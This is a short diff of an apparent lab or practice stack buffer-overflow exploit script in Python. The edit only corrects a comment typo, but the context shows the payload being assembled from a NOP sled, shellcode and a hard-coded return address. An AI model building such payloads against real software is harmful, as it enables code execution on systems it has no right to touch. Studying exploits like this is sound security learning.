@@ -22,7 +22,7 @@ nop = b"\x90"
 
 payload = nop * (bufsize - (len(shellcode) + 8 + 6)) + shellcode
 
-# this is the address of the buffer that needs to be replace (aquired from ./find_buffer_addr.sh)
+# this is the address of the buffer that needs to be replaced (aquired from ./find_buffer_addr.sh)
 buff_addr = b"\x30\x95\xff\xff\xff\x7f"
 payload = payload + b"\xaa\xaa" + buff_addr
 
